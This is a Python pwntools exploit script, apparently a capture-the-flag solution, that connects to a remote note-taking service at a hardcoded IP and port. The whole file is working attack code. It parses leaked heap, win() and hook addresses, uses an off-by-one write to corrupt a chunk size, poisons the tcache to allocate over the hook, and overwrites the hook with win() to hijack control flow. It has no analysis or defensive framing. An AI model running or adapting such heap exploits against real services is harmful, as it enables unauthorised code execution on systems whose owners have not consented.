#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

io = remote('212.2.250.33', 32384)

# Get addresses
banner = io.recvuntil(b'>')
print(banner.decode())

import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

log.success(f"heap: 0x{heap:x}")
log.success(f"win(): 0x{win:x}")
log.success(f"hook: 0x{hook:x}")

# Calculate offset from heap to hook
offset = hook - heap
log.info(f"Offset from heap to hook: 0x{offset:x}")

# Strategy: Create a note, use off-by-one to corrupt size,
# then use tcache poisoning to write to hook

# Create note 0
io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'A' * 32)
io.recvuntil(b'>')

# Create note 1  
io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'B' * 32)
io.recvuntil(b'>')

# Create note 2
io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'C' * 32)
io.recvuntil(b'>')

# Edit note 0 - append 1 byte (off-by-one)
io.sendline(b'2')
io.sendlineafter(b':', b'0')
io.sendlineafter(b':', b'\x71')  # Overwrite size to 0x71
io.recvuntil(b'>')

# Delete note 1 (with corrupted size)
io.sendline(b'3')
io.sendlineafter(b':', b'1')
io.recvuntil(b'>')

# Create smaller note to get overlap
io.sendline(b'1')
io.sendlineafter(b':', b'16')
# Write fd pointer to hook address
payload = b'D' * 8 + p64(hook)
io.sendlineafter(b':', payload)
io.recvuntil(b'>')

# Allocate to consume the freed chunk
io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'E' * 32)
io.recvuntil(b'>')

# Next allocation should be at hook
io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', p64(win) + b'F' * 24)  # Write win() address to hook
io.recvuntil(b'>')

# Trigger the hook
io.sendline(b'3')
io.sendlineafter(b':', b'0')

# Get output
try:
    output = io.recvall(timeout=3)
    print(output.decode(errors='ignore'))
except:
    pass

io.close()
